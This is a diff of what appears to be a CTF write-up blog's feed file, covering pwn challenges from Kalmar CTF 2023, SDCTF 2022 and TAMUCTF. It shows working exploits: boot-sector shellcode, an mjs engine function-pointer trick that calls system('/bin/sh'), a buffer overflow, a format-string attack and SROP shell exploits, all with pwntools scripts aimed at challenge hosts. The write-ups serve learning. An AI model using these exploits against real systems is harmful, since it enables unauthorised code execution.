+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ah, 0x2                ; read sectors from drive</span><br><span class="line">nop</span><br><span class="line">mov al, 1                  ; sectors to read</span><br><span class="line">nop</span><br><span class="line">mov ch, 0                  ; cylinder idx</span><br><span class="line">nop</span><br><span class="line">mov dh, 0                  ; head idx</span><br><span class="line">nop</span><br><span class="line">mov cl, 2                  ; sector idx</span><br><span class="line">nop</span><br><span class="line">mov dl, 0x80               ; disk idx</span><br><span class="line">nop</span><br><span class="line">mov bx, 0x7e00             ; target pointer</span><br><span class="line">int 0x13                   ; interrupt</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="final-shellcode"><a href="#final-shellcode" class="headerlink" title="final shellcode"></a>final shellcode</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bits 16]</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    mov ah, 0x2                ; read sectors from drive</span><br><span class="line">    nop</span><br><span class="line">    mov al, 1                  ; sectors to read</span><br><span class="line">    nop</span><br><span class="line">    mov ch, 0                  ; cylinder idx</span><br><span class="line">    nop</span><br><span class="line">    mov dh, 0                  ; head idx</span><br><span class="line">    nop</span><br><span class="line">    mov cl, 2                  ; sector idx</span><br><span class="line">    nop</span><br><span class="line">    mov dl, 0x80               ; disk idx</span><br><span class="line">    nop</span><br><span class="line">    mov bx, 0x7e00             ; target pointer</span><br><span class="line">    int 0x13                   ; interrupt</span><br><span class="line">    mov dx, 0x3f8              ; serial out</span><br><span class="line">    mov si, bx                 ; source buffer (start of flag)</span><br><span class="line">loop:</span><br><span class="line">    lodsb                      ; load byte from si into al, advance si</span><br><span class="line">    out dx, al                 ; send al to serial out</span><br><span class="line">    jmp loop                   ; repeat</span><br><span class="line">    nop                        ; padding</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>credit to my teammate @jason</p>
+</blockquote>
+<p>compile it with</p>
+<p><code>nasm shellcode.asm -o shellcode.o</code></p>
+<p>yep! all the first bytes are different!!!!!</p>
+<p><img data-src="/2023-03-05_233622.png" alt="2023-03-05_233622.png"></p>
+<h1 id="0x5-Script-Steps"><a href="#0x5-Script-Steps" class="headerlink" title="0x5 Script Steps"></a>0x5 Script Steps</h1><ol>
+<li>write function which point to shell code</li>
+<li>write shellcode</li>
+<li>call shellcode</li>
+<li>retrieve flag</li>
+</ol>
+<h1 id="0x6-Exploit"><a href="#0x6-Exploit" class="headerlink" title="0x6 Exploit"></a>0x6 Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([<span class="string">&quot;qemu-system-i386&quot;</span>, </span><br><span class="line">            <span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./bios&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-display&quot;</span>,<span class="string">&quot;none&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-drive&quot;</span>,<span class="string">&quot;format=raw,file=bootjs.bin&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-serial&quot;</span>,<span class="string">&quot;stdio&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;54.93.211.13&quot;</span>, <span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.LOCAL:</span><br><span class="line">    hash_challenge = io.recvline().split()</span><br><span class="line">    lp(<span class="string">&quot;proof of work:&quot;</span>, hash_challenge)</span><br><span class="line">    <span class="keyword">if</span> hash_challenge[<span class="number">0</span>] == <span class="string">b&#x27;hashcash&#x27;</span> <span class="keyword">and</span> hash_challenge[<span class="number">1</span>] == <span class="string">b&#x27;-mb28&#x27;</span>:</span><br><span class="line">        response = subprocess.run([</span><br><span class="line">            <span class="string">&#x27;hashcash&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;-mb28&#x27;</span>,</span><br><span class="line">            hash_challenge[<span class="number">2</span>].decode(),</span><br><span class="line">        ], capture_output=<span class="literal">True</span>).stdout</span><br><span class="line">        io.send(response)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_js</span>(<span class="params">value</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt; &quot;</span>,value)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_rs</span>(<span class="params">is_log</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;\r\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> is_log:</span><br><span class="line">        data = io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;b40290b00190b50090b60090b10290b28090bb007ecd13baf80389deaceeebfc90&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_mem</span>(<span class="params">val,value</span>):</span><br><span class="line">    <span class="comment"># dec_value = int.from_bytes(value,&quot;little&quot;)</span></span><br><span class="line">    payload = val+<span class="string">b&#x27;=&#x27;</span>+(<span class="built_in">str</span>(value % <span class="number">9</span>)+<span class="string">&quot;+9&quot;</span>*(value // <span class="number">9</span>)+<span class="string">&quot;\n&quot;</span>).encode()</span><br><span class="line">    <span class="comment"># lp(payload)</span></span><br><span class="line">    send_js(payload)</span><br><span class="line">    <span class="comment"># lp(io.recvuntil(b&quot;\r\n&quot;))</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">write_to_mem(<span class="string">b&quot;a&quot;</span>,<span class="number">0x7c7a</span>)</span><br><span class="line">write_to_mem(<span class="string">b&#x27;b&#x27;</span>,<span class="number">0x7ce3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(shellcode),<span class="number">3</span>):</span><br><span class="line">    part =  shellcode[i:i+<span class="number">3</span>]</span><br><span class="line">    lp(<span class="string">&quot;sending&quot;</span>,i,part[<span class="number">0</span>].to_bytes(<span class="number">1</span>,<span class="string">&quot;little&quot;</span>),<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(part[<span class="number">1</span>:],<span class="string">&quot;little&quot;</span>)))</span><br><span class="line">    write_to_mem(part[<span class="number">0</span>].to_bytes(<span class="number">1</span>,<span class="string">&quot;little&quot;</span>),<span class="built_in">int</span>.from_bytes(part[<span class="number">1</span>:],<span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">send_js(<span class="string">b&quot;b(0)&quot;</span>)</span><br><span class="line">lp(io.recvuntil(<span class="string">b&quot;&#125;&quot;</span>))</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x7-flag"><a href="#0x7-flag" class="headerlink" title="0x7 flag"></a>0x7 flag</h1><p><code>kalmar&#123;this_would_be_a_nice_addon_to_all_efi_shells_right?&#125;</code></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
+<li><a href="https://infosecwriteups.com/writing-a-bootloader-931da062f25b">https://infosecwriteups.com/writing-a-bootloader-931da062f25b</a></li>
+<li><a href="https://medium.com/swlh/an-introduction-to-i386-boot-loader-programming-823354b80846">https://medium.com/swlh/an-introduction-to-i386-boot-loader-programming-823354b80846</a></li>
+<li><a href="http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/">http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/</a></li>
+<li><a href="https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html">https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html</a></li>
+<li><a href="https://en.wikipedia.org/wiki/INT_13H#INT_13h_AH=02h:_Read_Sectors_From_Drive">https://en.wikipedia.org/wiki/INT_13H#INT_13h_AH=02h:_Read_Sectors_From_Drive</a></li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
+    <title>[Pwn] mjs [Kalmar CTF 2023]</title>
+    <url>/ctf-writeup/2023/kalmar/pwn/mjs/index.html</url>
+    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Description: TDB</p>
+<p>Files: TBD</p>
+<h1 id="0x1-Investigating-Repository"><a href="#0x1-Investigating-Repository" class="headerlink" title="0x1 Investigating Repository"></a>0x1 Investigating Repository</h1><p>looking at mjs github <a href="https://github.com/cesanta/mjs">repo</a></p>
+<p>I found three vary suspicious function. <code>mkstr</code> and <code>ffi</code>. </p>
+<p><code>mkstr</code> allow you make string in <strong>any</strong> memory address.</p>
+<p><code>ffi</code> allow you to import C function into js environment. This means we can import <code>system</code> into js environment and call <code>system(&#39;/bin/sh&#39;)</code> to getting a shell.</p>
+<p><img data-src="/2023-03-05_171001.png" alt="2023-03-05_171001.png"></p>
+<p>However, challenge disabled those function. So, if you are trying to call those function, you will find this function is not defined. </p>
+<p><img data-src="/2023-03-05_171552.png" alt="2023-03-05_171552.png"></p>
+<p>When I&#39;m playing around with this javascript engine. I found following interesting statements. </p>
+<p>We can operate function pointer using mathematical operation (like C). </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">17:19:25 $ ./mjsvuln -e <span class="string">&quot;print(print)&quot;</span></span><br><span class="line">&lt;foreign_ptr@405920&gt;</span><br><span class="line">undefined</span><br><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:25:52 $ ./mjsvuln -e <span class="string">&quot;(0x405920)(1)&quot;</span></span><br><span class="line">  at &lt;stdin&gt;:1</span><br><span class="line">MJS error: calling non-callable</span><br><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:26:04 $ ./mjsvuln -e <span class="string">&quot;(print+9-9)(print)&quot;</span></span><br><span class="line">&lt;foreign_ptr@405920&gt;</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>
+
+<p><em>The binary is compiled with glibc2.34. I&#39;m using Ubuntu20.04, so I need to recompile the binary again. So, some function offset might is different from the original binary.</em></p>
+<p>I calculated the offset between <code>print</code> and <code>ffi</code>. And try to call <code>ffi</code> again. This time, it succeed with an unknown function pointer.</p>
+<p><img data-src="/2023-03-05_183906.png" alt="2023-03-05_183906.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:46:33 $ python -c <span class="string">&quot;print(0x0040cbb0-0x00405920)&quot;</span></span><br><span class="line">29328</span><br><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:46:38 $ ./mjsvuln -e <span class="string">&#x27;let f= (print+29328)(&quot;int system(char *)&quot;);&#x27;</span></span><br><span class="line">&lt;???-562949926229504&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Then I can just called <code>/bin/sh</code> and got the shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:46:40 $ ./mjsvuln -e &#x27;let f= (print+29328)(&quot;int system(char *)&quot;);f(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">$ ls</span><br><span class="line">Dockerfile  README.txt  diff.patch  exploit.js  mjs  mjs_src  mjsvuln  remote.py  source  ynetd</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x2-final-exploit"><a href="#0x2-final-exploit" class="headerlink" title="0x2 final exploit"></a>0x2 final exploit</h1><p>offset is little different in the original binary</p>
+<p>exploit.js</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let f= (print+27312)(&quot;int system(char *)&quot;);f(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x3-flag"><a href="#0x3-flag" class="headerlink" title="0x3 flag"></a>0x3 flag</h1><p><code>kalmar&#123;mjs_brok3ey_565591da7d942fef817c&#125;</code></p>
 ]]></content>
   </entry>
   <entry>
@@ -5454,6 +5595,23 @@ https://www.bsfdvbsbilibili.com
 ]]></content>
   </entry>
   <entry>
+    <title>[Pwn] Horoscope [SDCTF 2022]</title>
+    <url>/ctf-writeup/2022/sdctf/pwn/horoscope/index.html</url>
+    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Easy</p>
+<p>This program will predict your future!</p>
+<p>Connect<br>nc horoscope.sdc.tf 1337</p>
+<p>By green beans</p>
+<p>files: <a href="horoscope">horoscope</a></p>
+<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>binary have a <code>/bin/sh</code> backdoor in function <code>sym.test</code>.</p>
+<p><code>main</code> has a buffer overflow vulnerbility, we can change rip of main to <code>sym.test</code> and get shell.</p>
+<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">exe = ELF(&quot;./horoscope&quot;)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def conn():</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        if args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    else:</span><br><span class="line">        r = remote(&quot;horoscope.sdc.tf&quot;,1337)</span><br><span class="line"></span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line">io = conn()</span><br><span class="line">if args.R2:</span><br><span class="line">    input(&quot;asd&quot;)</span><br><span class="line">io.sendlineafter(b&quot;own horoscope\n&quot;,flat(&#123;</span><br><span class="line">    0:b&quot;01/01/2001/1234\x00&quot;,</span><br><span class="line">    0x30+8:0x0040095f</span><br><span class="line">&#125;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>sdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y}</p>
+]]></content>
+  </entry>
+  <entry>
     <title>[Pwn] Oil Spill [SDCTF 2022]</title>
     <url>/ctf-writeup/2022/sdctf/pwn/oil-spill/index.html</url>
     <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Easy</p>
@@ -5469,23 +5627,6 @@ https://www.bsfdvbsbilibili.com
 <h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">exe = ELF(&quot;./OilSpill_patched&quot;)</span><br><span class="line">libc = ELF(&quot;./libc6_2.27-3ubuntu1.5_amd64.so&quot;)</span><br><span class="line">ld = ELF(&quot;./ld-2.27.so&quot;)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def conn():</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        if args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    else:</span><br><span class="line">        r = remote(&quot;oil.sdc.tf&quot;, 1337)</span><br><span class="line"></span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    r = conn()</span><br><span class="line">    if args.R2:</span><br><span class="line">        input(&quot;wait&quot;)</span><br><span class="line">    x = r.recvuntil(b&quot;\n&quot;,drop=True).split(b&quot;, &quot;)</span><br><span class="line">    libc.address = int(x[0],16) - libc.sym[&quot;puts&quot;]</span><br><span class="line">    rip_address = int(x[2],16) + 0x148</span><br><span class="line">    print(&quot;rip addr&quot;,hex(rip_address))</span><br><span class="line">    print(&quot;libc base addr&quot;,hex(libc.address))</span><br><span class="line">    one_gadget = libc.address+0x10a2fc</span><br><span class="line">    print(&quot;one_gadget&quot;,hex(one_gadget))</span><br><span class="line">    r.sendlineafter(b&#x27;clean it?\n&#x27;,fmtstr_payload(8,&#123;rip_address:one_gadget&#125;,write_size=&#x27;short&#x27;))</span><br><span class="line">    r.recvuntil(b&quot;Proposition&quot;)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>sdctf{th4nks_f0r_S4V1nG_tH3_duCk5}</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>[Pwn] Horoscope [SDCTF 2022]</title>
-    <url>/ctf-writeup/2022/sdctf/pwn/horoscope/index.html</url>
-    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Easy</p>
-<p>This program will predict your future!</p>
-<p>Connect<br>nc horoscope.sdc.tf 1337</p>
-<p>By green beans</p>
-<p>files: <a href="horoscope">horoscope</a></p>
-<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>binary have a <code>/bin/sh</code> backdoor in function <code>sym.test</code>.</p>
-<p><code>main</code> has a buffer overflow vulnerbility, we can change rip of main to <code>sym.test</code> and get shell.</p>
-<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">exe = ELF(&quot;./horoscope&quot;)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def conn():</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        if args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    else:</span><br><span class="line">        r = remote(&quot;horoscope.sdc.tf&quot;,1337)</span><br><span class="line"></span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line">io = conn()</span><br><span class="line">if args.R2:</span><br><span class="line">    input(&quot;asd&quot;)</span><br><span class="line">io.sendlineafter(b&quot;own horoscope\n&quot;,flat(&#123;</span><br><span class="line">    0:b&quot;01/01/2001/1234\x00&quot;,</span><br><span class="line">    0x30+8:0x0040095f</span><br><span class="line">&#125;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>sdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y}</p>
 ]]></content>
   </entry>
   <entry>
@@ -5730,170 +5871,6 @@ https://www.bsfdvbsbilibili.com
 <h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;void&quot;</span><br><span class="line">    libc = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;rua.host.goes.here&quot;</span><br><span class="line">    port = 8000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;void&quot;)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    No RELRO</span><br><span class="line">#    Stack:    No canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def int2byte(x: int):</span><br><span class="line">    return x.to_bytes(exe.bytes, &quot;little&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def wait_for_debugger(io):</span><br><span class="line">    if args.LOCAL and input(&quot;debugger?&quot;) == &quot;y\n&quot;:</span><br><span class="line">        pid = util.proc.pidof(io)[0]</span><br><span class="line">        log_print(&quot;The pid is: &quot; + str(pid))</span><br><span class="line">        util.proc.wait_for_debugger(pid)</span><br><span class="line">        log_print(&quot;press enter to continue&quot;)</span><br><span class="line"></span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">wait_for_debugger(io)</span><br><span class="line"></span><br><span class="line"># rax syscall x64</span><br><span class="line"># 0   read</span><br><span class="line"># 1   write</span><br><span class="line"># 15  rt_sigreturn</span><br><span class="line"># 59  execve</span><br><span class="line"></span><br><span class="line">main_addr = exe.sym[&quot;main&quot;]</span><br><span class="line">syscall_ret_addr = 0x00401018</span><br><span class="line">fake_rwx_stack_addr = 0x004020b8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mprotect_frame = SigreturnFrame()</span><br><span class="line">mprotect_frame.rip = syscall_ret_addr # return to main and do other thing</span><br><span class="line">mprotect_frame.rsp = fake_rwx_stack_addr</span><br><span class="line">mprotect_frame.rax = constants.SYS_mprotect</span><br><span class="line">mprotect_frame.rdi = 0x00402000</span><br><span class="line">mprotect_frame.rsi = 0x1000</span><br><span class="line">mprotect_frame.rdx = 7 # rwx</span><br><span class="line"></span><br><span class="line">do_mprotect = flat(&#123;</span><br><span class="line">    0:[</span><br><span class="line">        main_addr,</span><br><span class="line">        syscall_ret_addr,</span><br><span class="line">        bytes(mprotect_frame)</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">input(&quot;send mprotect payload&quot;)</span><br><span class="line">io.send(do_mprotect) # set up sigreturn frame</span><br><span class="line">input(&quot;trigger sigreturn and mprotect&quot;)</span><br><span class="line">io.send(do_mprotect[8:8+15]) # read 15 bytes, trigger sigreturn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">execve_bin_sh_frame = SigreturnFrame()</span><br><span class="line">execve_bin_sh_frame.rip = syscall_ret_addr # return to main and do other thing</span><br><span class="line">execve_bin_sh_frame.rsp = fake_rwx_stack_addr # </span><br><span class="line">execve_bin_sh_frame.rax = constants.SYS_execve</span><br><span class="line">execve_bin_sh_frame.rdi = fake_rwx_stack_addr +8+ len(flat(&#123;0:[main_addr,syscall_ret_addr,bytes(execve_bin_sh_frame)]&#125;))</span><br><span class="line">execve_bin_sh_frame.rsi = 0</span><br><span class="line">execve_bin_sh_frame.rdx = 0</span><br><span class="line"></span><br><span class="line">do_execve_bin_sh = flat(&#123;</span><br><span class="line">    0:[</span><br><span class="line">        main_addr,</span><br><span class="line">        syscall_ret_addr,</span><br><span class="line">        bytes(execve_bin_sh_frame),</span><br><span class="line">        b&quot;/bin/sh\x00&quot;,</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input(&quot;send execve bin/sh payload&quot;)</span><br><span class="line">io.send(do_execve_bin_sh) # set up sigreturn frame</span><br><span class="line">input(&quot;trigger sigreturn and mprotect&quot;)</span><br><span class="line">io.send(do_execve_bin_sh[8:8+15]) # read 15 bytes, trigger sigreturn</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>gigem{1_6u355_7h475_h0w_w3_3xpl017_17}</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>[Pwn] mjs [Kalmar CTF 2023]</title>
-    <url>/ctf-writeup/2023/kalmar/pwn/mjs/index.html</url>
-    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Description: TDB</p>
-<p>Files: TBD</p>
-<h1 id="0x1-Investigating-Repository"><a href="#0x1-Investigating-Repository" class="headerlink" title="0x1 Investigating Repository"></a>0x1 Investigating Repository</h1><p>looking at mjs github <a href="https://github.com/cesanta/mjs">repo</a></p>
-<p>I found three vary suspicious function. <code>mkstr</code> and <code>ffi</code>. </p>
-<p><code>mkstr</code> allow you make string in <strong>any</strong> memory address.</p>
-<p><code>ffi</code> allow you to import C function into js environment. This means we can import <code>system</code> into js environment and call <code>system(&#39;/bin/sh&#39;)</code> to getting a shell.</p>
-<p><img data-src="/2023-03-05_171001.png" alt="2023-03-05_171001.png"></p>
-<p>However, challenge disabled those function. So, if you are trying to call those function, you will find this function is not defined. </p>
